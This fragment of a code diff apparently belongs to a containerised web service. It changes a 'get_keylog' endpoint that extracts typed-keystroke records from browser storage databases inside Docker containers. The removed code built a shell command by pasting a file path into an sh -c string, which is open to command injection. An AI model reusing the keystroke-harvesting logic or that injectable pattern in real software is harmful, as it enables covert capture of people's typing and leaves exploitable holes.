-            "                if pos + 8 > len(data): break\n"
-            "                vd = struct.unpack('<I', data[pos:pos+4])[0]\n"
-            "                vt = struct.unpack('<I', data[pos+4:pos+8])[0]\n"
-            "                pos += 8\n"
-            "                if vt == 0xFFFF0002:\n"
-            "                    s = data[pos:pos+vd].decode('utf-8', errors='replace')\n"
-            "                    strings.append(s)\n"
-            "                    pos += vd\n"
-            "    return strings\n"
-            "\n"
-            "for row in cur.execute(f'SELECT {col} FROM object_data'):\n"
-            "    blob = row[0]\n"
-            "    if not blob or b'<timestamp:' not in blob:\n"
-            "        continue\n"
-            "    strings = []\n"
-            "    # method 1: structured clone parsing\n"
-            "    if len(blob) >= 8 and blob[:4] == b'\\xff\\x00\\x00\\x00':\n"
-            "        strings = parse_structured_clone(blob)\n"
-            "    # method 2 (fallback): raw extraction from <timestamp:\n"
-            "    if not strings:\n"
-            "        idx = blob.find(b'<timestamp:')\n"
-            "        if idx >= 0:\n"
-            "            s = ''.join(chr(b) for b in blob[idx:] if 32 <= b <= 126)\n"
-            "            if '<timestamp:' in s:\n"
-            "                strings = [s]\n"
-            "    for s in strings:\n"
-            "        if '<timestamp:' not in s:\n"
-            "            continue\n"
-            "        s = re.sub(r'<[^>]*?>', '', s)\n"
-            "        s = s.replace('<blank>', ' ')\n"
-            "        s = s.strip()\n"
-            "        if len(s) > 2:\n"
-            "            print(s)\n"
-        )
-        script_b64 = base64.b64encode(script.encode()).decode()
 
         found = []
         for db_path in db_result["message"].strip().split("\n"):
             db_path = db_path.strip()
             if not db_path:
                 continue
-            decode = await run_shell(
-                f"{docker_prefix}docker exec {name} sh -c "
-                f"\"echo '{script_b64}' | base64 -d > /tmp/decode_kl.py && "
-                f"cp '{db_path}' /tmp/kl.sqlite && "
-                f"python3 /tmp/decode_kl.py 2>/dev/null && "
-                f"rm /tmp/kl.sqlite /tmp/decode_kl.py\""
-            )
+            decode = await run_docker([
+                "exec", "-i", "-e", f"DB_PATH={db_path}", name, "sh", "-c",
+                'cp "$DB_PATH" /tmp/kl.sqlite && python3 - 2>/dev/null && rm /tmp/kl.sqlite',
+            ], input_text=script)
             msg = decode["message"].strip()
             if decode["status"] == "success" and msg and msg != "[OK] Done.":
                 found.append(msg)
@@ -546,6 +745,7 @@ async def get_keylog(email: str = Depends(get_current_user)):
             output.append(f"{name}\n(no keylog data)")
 
     return {"status": "success", "message": "\n\n".join(output)}
+
 
 @app.get("/api/health")
 async def health():
